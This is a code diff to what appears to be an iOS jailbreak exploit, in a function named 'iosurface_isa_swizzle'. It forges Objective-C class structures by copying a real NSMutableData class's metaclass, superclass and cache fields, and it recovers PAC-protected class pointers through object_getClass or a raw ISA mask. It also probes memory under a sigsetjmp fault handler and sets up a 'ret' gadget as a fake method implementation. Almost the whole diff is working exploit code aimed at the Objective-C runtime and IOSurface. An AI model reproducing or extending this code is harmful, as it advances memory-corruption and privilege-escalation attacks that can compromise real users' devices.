@@ -30692,17 +30692,58 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
         // Place bucket array at offset 0x20000
         uint64_t *fakeBuckets = (uint64_t *)(fakeClassMem + 0x20000);
 
-        // The real NSMutableData class ISA and superclass from JB26 results
-        // We read them live
+        // Use object_getClass to safely get the real class pointer (handles PAC)
         NSMutableData *sampleObj = [NSMutableData dataWithLength:64];
-        uint64_t *samplePtr = (uint64_t *)(uintptr_t)(__bridge void *)sampleObj;
-        uint64_t realISA = samplePtr[0] & 0x0000007FFFFFFFFEULL; // strip PAC
-        uint64_t *realClass = (uint64_t *)(uintptr_t)realISA;
 
-        log([NSString stringWithFormat:@"JB29:   Real NSMutableData ISA = %#llx", realISA]);
-        log([NSString stringWithFormat:@"JB29:   Real metaclass = %#llx", realClass[0]]);
-        log([NSString stringWithFormat:@"JB29:   Real superclass = %#llx", realClass[1]]);
-        log([NSString stringWithFormat:@"JB29:   Real cache = %#llx", realClass[2]]);
+        typedef void *(*object_getClass_fn)(void *);
+        object_getClass_fn getClass = dlsym(RTLD_DEFAULT, "object_getClass");
+
+        uint64_t realISA = 0;
+        uint64_t *realClass = NULL;
+        uint64_t rc0 = 0, rc1 = 0, rc2 = 0, rc3 = 0;
+        uint64_t rc4 = 0, rc5 = 0, rc6 = 0, rc7 = 0;
+
+        if (getClass) {
+            realISA = (uint64_t)(uintptr_t)getClass((__bridge void *)sampleObj);
+            realClass = (uint64_t *)(uintptr_t)realISA;
+            log([NSString stringWithFormat:@"JB29:   Real NSMutableData class = %#llx (via object_getClass)", realISA]);
+        } else {
+            // Fallback: raw ISA with arm64e mask
+            uint64_t *samplePtr = (uint64_t *)(uintptr_t)(__bridge void *)sampleObj;
+            realISA = samplePtr[0] & 0x007FFFFFFFFFFFF8ULL;
+            realClass = (uint64_t *)(uintptr_t)realISA;
+            log([NSString stringWithFormat:@"JB29:   Real NSMutableData ISA = %#llx (raw masked)", realISA]);
+        }
+
+        // Read class fields with fault protection
+        {
+            extern void jb25_setup(void);
+            extern volatile unsigned long jb25_far;
+            extern volatile unsigned long jb25_esr;
+            extern volatile int jb25_sig;
+            extern volatile sig_atomic_t jb25_in_probe;
+            extern struct jb25_jb_holder *jb25_jb_ptr;
+
+            jb25_setup();
+            jb25_far = 0; jb25_sig = 0;
+
+            if (realClass && (!jb25_jb_ptr || sigsetjmp(jb25_jb_ptr->b, 1) == 0)) {
+                jb25_in_probe = 1;
+                rc0 = realClass[0]; rc1 = realClass[1];
+                rc2 = realClass[2]; rc3 = realClass[3];
+                rc4 = realClass[4]; rc5 = realClass[5];
+                rc6 = realClass[6]; rc7 = realClass[7];
+                jb25_in_probe = 0;
+            } else {
+                jb25_in_probe = 0;
+                log([NSString stringWithFormat:@"JB29:   [!] FAULT reading class: sig=%d far=%#lx", jb25_sig, jb25_far]);
+            }
+        }
+
+        log([NSString stringWithFormat:@"JB29:   metaclass  = %#llx", rc0]);
+        log([NSString stringWithFormat:@"JB29:   superclass = %#llx", rc1]);
+        log([NSString stringWithFormat:@"JB29:   cache      = %#llx", rc2]);
+        log([NSString stringWithFormat:@"JB29:   cache_mask = %#llx", rc3]);
 
         // Find a "ret" gadget to use as our IMP
         uint64_t retGadget = 0;
@@ -30747,7 +30788,7 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
         uint64_t bucketsAddr = (uint64_t)(uintptr_t)fakeBuckets;
 
         // Build the fake class
-        fakeClass[0] = realClass[0];  // metaclass ISA (copy from real)
+        fakeClass[0] = rc0;           // metaclass ISA (copy from real)
         fakeClass[1] = realISA;       // superclass = real NSMutableData
         // Cache field: on arm64, this is a preopt_cache_t or cache_t
         // cache_t has: { _bucketsAndMaybeMask, _maybeMask | _flags | _occupied }
@@ -30949,8 +30990,8 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
             // We can override forwardingTargetForSelector to redirect!
 
             // Layout attempt 3: Try the real cache layout from the sample object
-            uint64_t realCacheField = realClass[2];
-            uint64_t realCacheMask = realClass[3];
+            uint64_t realCacheField = rc2;
+            uint64_t realCacheMask = rc3;
             log([NSString stringWithFormat:@"JB29:   Real cache field: %#018llx", realCacheField]);
             log([NSString stringWithFormat:@"JB29:   Real cache mask:  %#018llx", realCacheMask]);
 
@@ -30988,13 +31029,14 @@ void iosurface_isa_swizzle(ISRLogBlock log, ISRDoneBlock done) {
             emptyBucket[0] = 0;  // IMP = 0
             emptyBucket[1] = 0;  // SEL = 0
 
-            fakeClass2[0] = realClass[0];  // metaclass
+            fakeClass2[0] = rc0;           // metaclass
             fakeClass2[1] = realISA;       // superclass = real NSMutableData
             fakeClass2[2] = (uint64_t)(uintptr_t)emptyBucket; // empty buckets
             fakeClass2[3] = 0;             // mask = 0 (no buckets)
 
-            // Copy more of the real class structure if present
-            for (int i = 4; i < 8; i++) fakeClass2[i] = realClass[i];
+            // Copy more of the real class structure
+            fakeClass2[4] = rc4; fakeClass2[5] = rc5;
+            fakeClass2[6] = rc6; fakeClass2[7] = rc7;
 
             uint64_t fakeClass2Addr = (uint64_t)(uintptr_t)fakeClass2;
 
